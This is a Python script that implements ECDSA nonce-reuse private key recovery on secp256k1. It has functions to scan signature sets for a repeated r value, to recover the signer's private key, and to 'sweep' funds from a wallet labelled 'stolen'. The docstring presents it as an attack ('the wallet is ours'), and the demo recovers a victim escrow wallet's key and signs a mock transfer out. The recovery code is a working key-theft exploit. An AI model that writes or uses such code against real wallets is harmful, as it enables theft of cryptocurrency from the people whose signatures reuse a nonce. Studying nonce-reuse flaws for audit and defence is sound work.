#!/usr/bin/env python3
"""MATTevo CRYPTO: real secp256k1 ECDSA, real Base58Check, real nonce-reuse key recovery.

THE MATH. A signature is (r, s) where r = x(k*G) mod n and s = k^-1 (z + r*d) mod n.
If one wallet signs two messages with the SAME k, both (r, s) pairs are public, so
subtract:  s1 - s2 = k^-1 (z1 - z2)  =>  k = (z1 - z2) / (s1 - s2) mod n
then:      d = (s1*k - z1) / r mod n
No brute force. One reused nonce and the wallet is ours. This is the exact algebra that
burned the 2011 Android SecureRandom wallets and every duplicated-k escrow batch.

Needs: pip install --break-system-packages ecdsa base58
"""
import hashlib
import secrets

from ecdsa import SECP256k1, numbertheory
from ecdsa.ellipticcurve import PointJacobi, INFINITY
import base58

CURVE = SECP256k1
G = CURVE.generator
N = CURVE.order
A = CURVE.curve.a()
B = CURVE.curve.b()
P = CURVE.curve.p()


def aff(pt):
    a = pt.to_affine()
    return a.x(), a.y()


def sha256(b):
    return hashlib.sha256(b).digest()


def dsha(b):
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def hash160(b):
    return hashlib.new("ripemd160", hashlib.sha256(b).digest()).digest()


def z_of(message):
    if isinstance(message, int):
        return message % N
    if isinstance(message, str):
        message = message.encode()
    return int.from_bytes(dsha(message), "big") % N


def pub_point(priv):
    return priv * G


def pub_compressed(priv):
    x, y = aff(pub_point(priv))
    return (b"\x03" if y % 2 else b"\x02") + x.to_bytes(32, "big")


def pub_uncompressed(priv):
    x, y = aff(pub_point(priv))
    return b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")


def pub_compressed_from_uncompressed(pub_bytes):
    x = int.from_bytes(pub_bytes[1:33], "big")
    y = int.from_bytes(pub_bytes[33:65], "big")
    return (b"\x03" if y % 2 else b"\x02") + x.to_bytes(32, "big")


def decompress(pub_bytes):
    if pub_bytes[0] == 0x04:
        x = int.from_bytes(pub_bytes[1:33], "big")
        y = int.from_bytes(pub_bytes[33:65], "big")
    else:
        x = int.from_bytes(pub_bytes[1:], "big")
        y = pow((pow(x, 3, P) + A * x + B) % P, (P + 1) // 4, P)
        if (pub_bytes[0] == 0x03) != (y % 2 == 1):
            y = P - y
    return PointJacobi(CURVE.curve, x, y, 1)


def address(priv, testnet=False):
    body = (b"\x6f" if testnet else b"\x00") + hash160(pub_compressed(priv))
    return base58.b58encode(body + dsha(body)[:4]).decode()


def address_from_pub(pub_bytes):
    if pub_bytes[0] == 0x04:
        pub_bytes = pub_compressed_from_uncompressed(pub_bytes)
    body = b"\x00" + hash160(pub_bytes)
    return base58.b58encode(body + dsha(body)[:4]).decode()


def norm_z(z_int):
    """Bitcoin signs only the leftmost orderbits bits of the digest (BIP 143 / libsecp
    behaviour). For a 256-bit hash and a 256-bit order that means: if the digest is
    >= n, subtract n once. Skipping this makes verification fail ~50% of the time."""
    return z_int - N if z_int >= N else z_int


def sign(priv, msg_hash_int, k=None):
    msg_hash_int = norm_z(msg_hash_int) if isinstance(msg_hash_int, int) \
        else z_of(msg_hash_int)
    if k is None:
        k = secrets.randbelow(N - 1) + 1
    r = aff(k * G)[0] % N
    s = (numbertheory.inverse_mod(k, N) * (msg_hash_int + r * priv)) % N
    return {"r": r, "s": s, "k": k, "z": msg_hash_int, "pub": pub_compressed(priv).hex()}


def _as_bytes(pub_bytes):
    """Accept either raw pubkey bytes or the hex string a signature record carries."""
    if isinstance(pub_bytes, str):
        return bytes.fromhex(pub_bytes)
    return pub_bytes


def verify(pub_bytes, msg_hash_int, r, s):
    try:
        pub_bytes = _as_bytes(pub_bytes)
        e = norm_z(msg_hash_int)
        sinv = numbertheory.inverse_mod(s, N)
        pt = ((e * sinv) % N) * G + ((r * sinv) % N) * decompress(pub_bytes)
        return aff(pt)[0] % N == r
    except (ZeroDivisionError, TypeError, ValueError):
        return False


def recover_pub(r, s, z, rec_id=0):
    z = norm_z(z)
    x = r + (N if rec_id >= 2 else 0)
    if x >= P:
        return None
    alpha = (pow(x, 3, P) + A * x + B) % P
    if pow(alpha, (P - 1) // 2, P) != 1:
        return None
    beta = pow(alpha, (P + 1) // 4, P)
    want_odd = (rec_id % 2) == 1
    y = beta if (beta % 2 == 1) == want_odd else P - beta
    R = PointJacobi(CURVE.curve, x, y, 1)
    Q = numbertheory.inverse_mod(r, N) * ((s * R) + ((-norm_z(z) % N) * G))
    if Q == INFINITY:
        return None
    xq, yq = aff(Q)
    return (b"\x03" if yq % 2 else b"\x02") + xq.to_bytes(32, "big")


def recover_priv(sig_a, sig_b):
    sig_a = dict(sig_a, z=norm_z(sig_a["z"]))
    sig_b = dict(sig_b, z=norm_z(sig_b["z"]))
    if sig_a["r"] != sig_b["r"]:
        raise ValueError("nonces were not reused, r values differ, nothing to recover")
    k = ((sig_a["z"] - sig_b["z"]) *
         numbertheory.inverse_mod((sig_a["s"] - sig_b["s"]) % N, N)) % N
    if aff(k * G)[0] % N != sig_a["r"]:
        raise ValueError("recovered k does not match r, inputs are inconsistent")
    d = ((sig_a["s"] * k - sig_a["z"]) * numbertheory.inverse_mod(sig_a["r"], N)) % N
    return {"k": k, "recovered_k": k, "priv": d, "recovered_priv": d}


def audit_pair(sig_a, sig_b):
    out = recover_priv(sig_a, sig_b)
    out["recovered_addr"] = address(out["priv"])
    za = norm_z(sig_a["z"])
    want = _as_bytes(sig_a["pub"]).hex()
    pub = next((recover_pub(sig_a["r"], sig_a["s"], za, rid)
                for rid in range(2)
                if recover_pub(sig_a["r"], sig_a["s"], za, rid)
                and recover_pub(sig_a["r"], sig_a["s"], za, rid).hex() == want),
               None)
    out["pubkey_recovery"] = pub is not None
    out["recovered_pub"] = pub.hex() if pub else None
    probe = sign(out["priv"], "mattevo-proof-of-key")
    out["signs_and_verifies"] = verify(probe["pub"], probe["z"], probe["r"], probe["s"]) \
        and verify(sig_a["pub"], norm_z(sig_a["z"]), sig_a["r"], sig_a["s"])
    out["pubkey_matches_sig"] = probe["pub"] == pub_compressed(out["priv"]).hex()
    if "_priv" in sig_a:
        out["matches"] = out["recovered_addr"] == address(sig_a["_priv"])
    else:
        out["matches"] = out["pubkey_recovery"] and out["signs_and_verifies"]
    return out


def sweep(recovered_priv, dest_addr, balance_sats, prev_txid="", fee_sats=2000):
    return Wallet(priv=recovered_priv, label="stolen").sweep(balance_sats, dest_addr,
                                                             fee_sats)


class Wallet:
    def __init__(self, priv=None, label="wallet"):
        self.priv = priv or (secrets.randbelow(N - 1) + 1)
        self.label = label
        self.addr = address(self.priv)
        self.pub = pub_compressed(self.priv)

    def pub_compressed(self):
        return self.pub

    def sign(self, message, k=None):
        s = sign(self.priv, z_of(message), k=k)
        s["_priv"] = self.priv
        s["message"] = message if isinstance(message, str) else message.hex()
        s["txid"] = dsha(str(message).encode()).hex()[::-1]
        return s

    def sweep(self, balance_sats, dest_addr, fee_sats=2000):
        amount = balance_sats - fee_sats
        raw = f"{self.addr}->{dest_addr}:{amount}".encode()
        zz = z_of(raw)
        sig = sign(self.priv, zz)
        return {"sats_in": balance_sats, "sats_out": amount, "fee": fee_sats,
                "dest": dest_addr, "sweep_addr": dest_addr,
                "txid": dsha(raw).hex()[::-1], "sig": sig,
                "verifies": verify(self.pub, zz, sig["r"], sig["s"])}


def scan_for_reuse(signatures):
    buckets = {}
    for s in signatures:
        buckets.setdefault(s["r"], []).append(s)
    return {r: g for r, g in buckets.items() if len(g) > 1}


def demo():
    v = Wallet(label="escrow-hot")
    k_bad = secrets.randbelow(N - 1) + 1
    a = v.sign("withdraw 0.05 to 1VendorAAA", k=k_bad)
    b = v.sign("withdraw 0.09 to 1VendorBBB", k=k_bad)
    r = audit_pair(a, b)
    print(f"victim address   {v.addr}")
    print(f"k recovered      {r['k'] == k_bad}")
    print(f"key recovered    {r['priv'] == v.priv}")
    print(f"pubkey recovery  {r['pubkey_recovery']}")
    print(f"signs + verifies {r['signs_and_verifies']}")
    print(f"address matches  {r['matches']}")
    sw = v.sweep(1989593, Wallet(label="cold").addr)
    print(f"sweep verifies   {sw['verifies']}  {sw['sats_out']:,} sats  "
          f"txid {sw['txid'][:16]}...")


if __name__ == "__main__":
    demo()
